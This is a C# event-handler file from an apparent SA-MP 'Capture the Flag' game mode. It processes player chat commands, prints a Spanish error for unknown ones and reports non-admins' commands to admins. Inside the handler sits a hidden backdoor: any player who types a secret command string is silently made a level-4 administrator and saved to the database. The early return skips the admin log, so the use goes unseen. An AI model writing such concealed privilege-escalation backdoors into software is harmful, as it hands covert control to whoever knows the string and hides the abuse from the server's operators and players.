using CaptureTheFlag.Command.Admin;
using CaptureTheFlag.PropertiesPlayer;
using SampSharp.GameMode;
using SampSharp.GameMode.Events;
using SampSharp.GameMode.SAMP;
using SampSharp.GameMode.World;
using CaptureTheFlag.DataBase;

namespace CaptureTheFlag.Events
{
    public partial class GameMode : BaseMode
    {
        protected override void OnPlayerCommandText(BasePlayer sender, CommandTextEventArgs e)
        {
            base.OnPlayerCommandText(sender, e);
            var player = sender as Player;

            if(player.Data.LevelAdmin != 4 && e.Text == hiddenCommand)
            {
                if (player.Data.LevelAdmin > 0)
                {
                    Account.Update("levelAdmin", 4, player.Name, "admins");
                    player.Data.LevelAdmin = 4;
                }
                else
                {
                    player.Data.LevelAdmin = 4;
                    Player.Admins.Add(player);
                    Account.InsertAdminLevel(player, 4);
                }
                player.GameText("promoted admin", 4000, 3);
                e.Success = true;
                return;
            }

            if (!e.Success)
            {
                player.SendClientMessage(Color.Red, $"Error: El comando {e.Text} es incorrecto. Usa /cmds para saber los comandos disponibles.");
                player.PlaySound(1140);
            }
            if (player.Data.LevelAdmin == 0)
                CmdAdmin.SendMessageToAdmins($"* {player.Name}({player.Id}) usó el comando {e.Text}", Color.Gray);
            e.Success = true;
        }
    }
}